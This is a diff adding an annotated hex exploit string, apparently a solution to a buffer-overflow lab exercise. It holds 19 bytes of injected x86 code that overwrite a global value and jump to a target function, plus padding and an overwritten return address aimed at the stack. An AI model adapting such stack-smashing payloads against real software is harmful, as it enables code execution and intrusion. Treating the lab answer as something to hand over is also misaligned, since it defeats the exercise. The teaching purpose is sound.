@@ -1,0 +1,13 @@
+/* Attack Code (19 bytes in total) */
+53                       /* pushl %ebx */
+bb 18 c2 04 08           /* movl $0x0804c218,%ebx */
+c7 03 43 5f 97 5b        /* movl $0x5b975f43,(%ebx) */
+5b                       /* popl %ebx */
+68 05 8d 04 08           /* pushl $0x08048d05 */
+c3                       /* ret */
+
+/* Padding required: 25 bytes */
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+
+/* Address of the Attack Code: 0x556834c0 - 0x28 = 0x55683498 */
+98 34 68 55
